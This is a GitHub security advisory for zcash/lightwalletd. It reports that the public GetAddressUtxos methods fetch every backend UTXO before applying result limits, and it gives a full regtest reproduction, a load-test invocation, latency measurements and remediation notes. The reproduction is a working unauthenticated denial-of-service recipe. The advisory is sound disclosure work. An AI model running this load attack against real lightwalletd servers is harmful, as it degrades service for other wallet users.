# GHSA-932p-ww36-57vg: Public `GetAddressUtxos` requests can overfetch backend UTXOs and degrade normal wallet requests

| Field | Value |
| --- | --- |
| Repo | zcash/lightwalletd |
| GHSA | GHSA-932p-ww36-57vg |
| CVE | none assigned |
| Severity | medium |
| CWE | CWE-400, CWE-770 |
| Published | 2026-08-27T18:58:26Z |
| Updated | 2026-10-25T02:49:45Z |
| Affected | github.com/zcash/lightwalletd <= 0.5.4 |
| Advisory URL | https://github.com/zcash/lightwalletd/security/advisories/GHSA-932p-ww36-57vg |

## Description (verbatim)

## Summary

GetAddressUtxos and GetAddressUtxosStream don't pass startHeight or maxEntries to zcashd. lightwalletd calls getaddressutxos with just the addresses, unmarshals everything that comes back, and only then applies the two limits (the unary version also keeps the result in one slice until it replies). So even maxEntries=1 makes zcashd fetch every UTXO of every address in the request.

On regtest, 50 parallel calls over 5,000 funded taddrs made my GetLatestBlock and GetAddressUtxos probes fail or take seconds in all 3 runs. With maxEntries=1 they still took ~2.84s.

## Severity

Low under the lightwalletd policy, maybe Medium for the ZCG initiative (https://forum.zcashcommunity.com/t/zcg-security-vulnerability-disclosure-initiative/55545), not sure how they score DoS.

## Affected Feature

The public gRPC methods GetAddressUtxos and GetAddressUtxosStream (frontend/service.go), and the getaddressutxos RPC on zcashd behind them.

## Root Cause

From getAddressUtxos in frontend/service.go:

```
result, rpcErr := common.RawRequest("getaddressutxos", params) // params is just {"addresses": [...]}
...
err = json.Unmarshal(result, &utxosReply)
...
for _, utxo := range utxosReply {
	if uint64(utxo.Height) < arg.StartHeight {
		continue
	}
	n++
	if arg.MaxEntries > 0 && uint32(n) > arg.MaxEntries {
		break
	}
```

## Steps to Reproduce

zcashd v6.12.3-db3082b0b-dirty on regtest, lightwalletd at 45b2f4cd.

```
# go 1.24.1
go build -o /tmp/lwd .
go build -o /tmp/poc ./poc_address_utxos/poc_address_utxos_attack.go

D=/tmp/lwd-poc
Z=/home/x/Desktop/zcash/src
mkdir -p $D/regtest $D/lwd
cli() { $Z/zcash-cli -datadir=$D/regtest "$@"; }

cat > $D/regtest/zcash.conf <<EOF
regtest=1
server=1
listen=0
txindex=1
experimentalfeatures=1
lightwalletd=1
debug=rpc
rpcbind=127.0.0.1
rpcallowip=127.0.0.1
rpcuser=taddrtxlow
rpcpassword=taddrtxlowpass
rpcport=18315
allowdeprecated=getnewaddress
nuparams=5ba81b19:1
nuparams=76b809bb:2
nuparams=2bb40e60:3
nuparams=f5b9230b:4
nuparams=e9ff75a6:5
nuparams=c2d6d0b4:6
nuparams=c8e71055:7
nuparams=4dec4df0:8
i-am-aware-zcashd-will-be-replaced-by-zebrad-and-zallet-in-2025=1
EOF
$Z/zcashd -datadir=$D/regtest -debuglogfile=$D/zcashd.log -daemon
until cli getblockchaininfo >/dev/null 2>&1; do sleep 1; done
cli generate 2600 >/dev/null

# 5000 addrs, one 0.0001 utxo each, 50 per tx
cli getnewaddress > $D/victim.txt
for i in $(seq 5000); do cli getnewaddress; done > $D/addrs.txt
split -l 50 $D/addrs.txt $D/batch_
cli listunspent 1 9999999 | jq -r '.[] | select(.spendable and .amount > 0.03) | "\(.txid) \(.vout) \(.amount)"' > $D/coins.txt
n=0
for b in $D/batch_*; do
  n=$((n+1))
  read txid vout amt < <(sed -n ${n}p $D/coins.txt)
  change=$(cli getnewaddress)
  left=$(awk "BEGIN{printf \"%.8f\", $amt - 0.005 - 0.01}")
  outs=$(sed 's/.*/"&":0.0001/' $b | paste -sd,)
  raw=$(cli createrawtransaction "[{\"txid\":\"$txid\",\"vout\":$vout}]" "{$outs,\"$change\":$left}")
  cli sendrawtransaction $(cli signrawtransaction $raw | jq -r .hex) >> $D/funding.txt
  [ $((n % 10)) = 0 ] && cli generate 1 >/dev/null
done
cli generate 5 >/dev/null

/tmp/lwd --no-tls-very-insecure --grpc-bind-addr=127.0.0.1:19127 --http-bind-addr=127.0.0.1:19128 --data-dir=$D/lwd --log-file=$D/lwd.log --rpchost=127.0.0.1 --rpcport=18315 --rpcuser=taddrtxlow --rpcpassword=taddrtxlowpass &

P="-probe-latest-interval 1s -probe-range-interval 1s -probe-range-start 0 -probe-range-end 9 -probe-utxo-interval 1s -probe-utxo-address $(cat $D/victim.txt) -probe-utxo-max-entries 1"
/tmp/poc -addr 127.0.0.1:19127 -plaintext $P -clients 0 -probe-duration 60s    # baseline
/tmp/poc -addr 127.0.0.1:19127 -plaintext $P -address-file $D/addrs.txt -clients 50 -timeout 600s
grep -c method=getaddressutxos $D/zcashd.log
```

Other runs were the same with -max-entries 1, -clients 10 / 20, -api stream, or -timeout 60s -cancel-after 2s.

Results:

```
50 clients, maxEntries=0. probes are p95 / fails (p99 was the same)

run  rows     time    zcashd calls  GetLatestBlock  GetBlockRange  victim utxos
1    250000   12.16s  +57           2.35s / 1       92ms / 0       2.19s / 1
2    250000   10.80s  +56           1.54s / 1       360ms / 0      4.76s / 0
3    250000   10.90s  +56           4.22s / 0       437ms / 0      4.01s / 0

baseline p95 was 39-54ms / 15-22ms / 36-53ms with no fails, and it was back there after every run
```

maxEntries=1:

```
api=unary addresses=5000 max_entries=1 total_clients=50 failed=0 returned=50 wall=6.40665576s
latest_probes=5 latest_failures=0 latest_p95=2.843062137s latest_p99=2.843062137s
victim_utxo_probes=5 victim_utxo_failures=0 victim_utxo_p95=2.843173371s victim_utxo_p99=2.843173371s
before_getaddressutxos=571
after_getaddressutxos=626
```

(55 calls = the 50 requests + 5 victim probes.)

10 and 20 clients: no fails, probes at 735-807ms. Stream API: same load on zcashd (+57 calls, probes 1.87-1.89s) but lwd CPU at 20.8% instead of up to 88%. With every client cancelling after 2s, zcashd's getaddressutxos count still went from 686 to 735 over the next 10s.

## Impact

Anyone who can reach the gRPC port can do this, no auth, just a list of taddrs that hold UTXOs. While it ran other clients failed or waited seconds. It recovered once it stopped.


## Remediation

- Enforce a maximum address count per request.
- Enforce a server-side maximum result budget before making or while making backend requests.
- Do not treat `maxEntries=0` as unlimited on public endpoints; use a conservative default.
- Push `startHeight` and result limits into the backend query if zcashd/Zebra supports it.
- Avoid full backend-result unmarshalling before applying limits.
- Check request context before and after backend calls and during conversion.
- Add per-client/global concurrency limits for expensive transparent-address queries.
- Return `codes.ResourceExhausted` when address count, requested output count, or response budget is exceeded.

## Status as of 0.5.4

No released version fixes this. 0.5.4 narrowed the surrounding surface without addressing the reported defect:

- `GetAddressUtxos` and `GetAddressUtxosStream` now collapse repeated addresses before the backend call, so naming one address n times no longer returns n copies of its UTXOs. This does not affect the reproduction above, which uses 5,000 distinct funded taddrs.
- Both methods now pass `startHeight` and `maxEntries` through to the backend `getaddressutxos` RPC. No released backend implements either argument (they simply ignore the extra JSON keys), so this changes nothing on its own. Zebra merged the other half on 2026-08-25 (ZcashFoundation/zebra#11317, `b2cc75b`), unreleased as of Zebra v6.3.0; a lightwalletd 0.5.4 or later paired with a Zebra release that includes it will bound the backend work as the arguments describe.

The reported behavior is unchanged: `startHeight` and `maxEntries` remain response filters applied after the whole backend result has been unmarshalled, so the UTXO set of every named address is produced by the backend and materialized in full, however narrow a height range or however few entries the caller asked for. `maxEntries=1` still bounds only what is returned, not what is fetched. The 10,000-address limit that `GetAddressUtxos` already enforced is well above the 5,000 addresses used in the reproduction, so it does not bound this either.

Until a fix ships, operators who cannot restrict access to their gRPC endpoint should expect a public client to be able to induce the latency described above, and should monitor backend load rather than rely on client-supplied limits to bound it.
